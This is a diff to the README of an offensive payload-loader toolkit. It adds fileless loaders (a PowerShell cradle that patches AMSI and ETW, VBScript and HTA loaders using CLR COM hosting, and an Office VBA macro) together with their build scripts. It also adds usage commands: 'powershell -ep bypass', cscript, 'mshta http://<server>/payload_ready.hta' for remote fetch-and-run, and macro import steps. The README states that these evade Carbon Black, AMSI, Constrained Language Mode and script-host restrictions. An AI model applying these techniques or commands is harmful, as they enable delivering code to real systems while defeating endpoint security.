@@ -48,6 +48,15 @@ All C++ loaders support both EXE and DLL invocation via compile-time `targetType
 | `csc_payload.cs` | csc.exe payload — standalone C# compiled on-target to EXE |
 | `assembly_loader.cs` | Managed C# loader with named pipe and TCP delivery channels |
 
+### No-Disk-Write Payloads (bypass Carbon Black unsigned binary blocking)
+
+| File | Description |
+|------|-------------|
+| `powershell_cradle.ps1` | PowerShell cradle — AMSI+ETW bypass (no Add-Type), AES decrypt, Assembly.Load |
+| `vbscript_payload.vbs` | VBScript loader — CLR COM hosting via CorRuntimeHost, runs under cscript.exe |
+| `hta_payload.hta` | HTA loader — same VBScript technique in mshta.exe, auto-hides window |
+| `vba_payload.bas` | VBA macro — CLR COM hosting from Excel/Word, bypasses CLM+WSH+cmd restrictions |
+
 ### Tooling
 
 | File | Description |
@@ -58,6 +67,10 @@ All C++ loaders support both EXE and DLL invocation via compile-time `targetType
 | `build_regasm.py` | One-command build: encrypts assembly and injects into RegAsm template |
 | `build_regsvcs.py` | One-command build: encrypts assembly and injects into RegSvcs template (strong-named) |
 | `build_csc.py` | One-command build: encrypts assembly and injects into csc.exe template |
+| `build_powershell.py` | One-command build: encrypts assembly and injects into PowerShell cradle |
+| `build_vbscript.py` | One-command build: encrypts assembly and injects into VBScript loader |
+| `build_hta.py` | One-command build: encrypts assembly and injects into HTA loader |
+| `build_vba.py` | One-command build: encrypts assembly and injects into VBA macro module |
 | `encrypt_payload.py` | XOR/AES encryptor — outputs C# byte arrays, raw binary, or hex |
 | `pipe_client.py` | Operator-side named pipe client for sending assemblies to the pipe listener |
 
@@ -228,6 +241,75 @@ python build_csc.py Seatbelt.exe -- -group=all
 # Transfer .cs to target and compile there:
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:payload.exe payload_ready.cs
 payload.exe
+```
+
+### PowerShell Cradle (no disk writes — bypasses Carbon Black)
+
+No compilation on target. AMSI bypassed via reflection + AmsiScanBuffer patch (no Add-Type).
+ETW patched via same Win32Native reflection technique. Supports environmental keying.
+
+```bash
+# One-command build
+python build_powershell.py Seatbelt.exe -- -group=all
+
+# XOR encryption
+python build_powershell.py Seatbelt.exe -e xor -- -group=all
+
+# Environmental keying
+python build_powershell.py Seatbelt.exe --keying hostname=WS01,domain=CORP -- -group=all
+
+# On target:
+powershell -ep bypass -f payload_ready.ps1
+```
+
+### VBScript Loader (cscript.exe — no disk writes)
+
+Bootstraps CLR via `mscoree.CorRuntimeHost` COM, AES-decrypts via .NET `RijndaelManaged`
+through COM interop, loads assembly via `AppDomain.Load_3(byte[])`. Runs under
+Microsoft-signed `cscript.exe` — zero files written to disk.
+
+```bash
+# One-command build
+python build_vbscript.py Seatbelt.exe -- -group=all
+
+# XOR encryption
+python build_vbscript.py Seatbelt.exe -e xor -- -group=all
+
+# On target:
+cscript //nologo payload_ready.vbs
+```
+
+### HTA Loader (mshta.exe — no disk writes)
+
+Same VBScript technique wrapped in an HTA. Runs under Microsoft-signed `mshta.exe`.
+Window auto-minimizes and closes after execution. Can be served over HTTP.
+
+```bash
+# One-command build
+python build_hta.py Seatbelt.exe -- -group=all
+
+# On target (local or remote):
+mshta payload_ready.hta
+mshta http://<server>/payload_ready.hta
+```
+
+### VBA Macro (Excel/Word — bypasses CLM, WSH, cmd restrictions)
+
+VBA runs inside the Office process (Microsoft-signed). Bypasses PowerShell Constrained Language
+Mode, WSH disable, cmd disable, and mshta restrictions. Same `CorRuntimeHost` COM technique.
+
+```bash
+# One-command build — generates importable .bas module
+python build_vba.py Seatbelt.exe -- -group=all
+
+# XOR encryption (no .NET COM needed for decrypt)
+python build_vba.py Seatbelt.exe -e xor -- -group=all
+
+# On target:
+#   1. Open Excel or Word
+#   2. Alt+F11 → VBA editor
+#   3. File > Import File > payload_ready.bas
+#   4. F5 to run
 ```
 
 ### Supported Assembly Types
